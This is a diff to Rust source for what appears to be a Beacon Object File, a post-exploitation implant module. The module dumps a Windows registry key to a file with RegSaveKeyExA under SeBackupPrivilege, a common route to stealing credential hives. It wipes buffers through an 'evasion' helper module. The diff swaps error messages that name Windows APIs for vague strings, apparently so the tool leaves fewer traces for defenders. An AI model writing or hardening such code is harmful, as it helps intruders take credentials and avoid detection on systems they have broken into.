@@ -104,13 +104,13 @@ fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
             path_buf.as_ptr() as *const i8,
             0, KEY_READ, &mut hkey,
         )
-    }.map_err(|_| "RegOpenKeyExA resolve failed")?;
+    }.map_err(|_| "resolve failed")?;
 
     if rc != ERROR_SUCCESS {
         // Wipe the path buffer before returning so the subkey doesn't linger.
         common::evasion::secure_zero(&mut path_buf);
         common::evasion::secure_zero(&mut file_buf);
-        return Err("RegOpenKeyExA failed (key not found / no access)");
+        return Err("key open failed");
     }
 
     let rc2 = unsafe {
@@ -120,7 +120,7 @@ fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
             core::ptr::null_mut(),
             REG_LATEST_FORMAT,
         )
-    }.map_err(|_| "RegSaveKeyExA resolve failed")?;
+    }.map_err(|_| "resolve failed")?;
 
     unsafe { let _ = reg_close_key(hkey); };
 
@@ -128,7 +128,7 @@ fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
         common::evasion::secure_zero(&mut path_buf);
         common::evasion::secure_zero(&mut file_buf);
         // Common cause: missing SeBackupPrivilege. Do not leak the path.
-        return Err("RegSaveKeyExA failed (need SeBackupPrivilege?)");
+        return Err("save failed");
     }
 
     // Success — log a short fingerprint of the subkey rather than the
